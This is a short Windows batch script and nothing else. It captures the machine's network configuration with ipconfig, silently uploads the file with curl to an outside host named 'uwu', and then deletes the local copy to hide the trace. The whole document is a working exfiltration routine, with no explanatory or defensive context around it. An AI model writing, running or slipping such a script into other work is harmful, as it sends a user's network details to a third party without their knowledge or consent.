@echo off
ipconfig > ip.txt
curl --silent --output /dev/null -F 1=@ip.txt uwu
del ip.txt
